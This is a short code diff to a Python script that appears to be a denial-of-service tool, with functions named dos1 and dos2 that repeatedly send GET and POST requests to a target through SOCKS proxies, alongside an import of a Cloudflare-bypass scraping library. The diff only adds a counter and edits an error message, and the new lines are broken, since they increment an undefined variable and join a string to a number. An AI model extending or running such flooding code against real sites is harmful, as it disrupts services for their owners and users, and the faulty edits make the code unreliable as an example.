@@ -6,6 +6,8 @@ import cfscrape
 import os
 import pyAesCrypt
 
+xxxx = 0
+
 os.system("clear")
 
 with open('useragent') as file:
@@ -53,7 +55,8 @@ def dos1(target):
             requests.get(target, headers=header2, proxies=proxiessocks)
             requests.post(target, headers=header2, proxies=proxiessocks)
         except:
-            print("Connection error")
+            x = x + 1
+            print("Connection error" + x)
 
 
 def dos2(target):
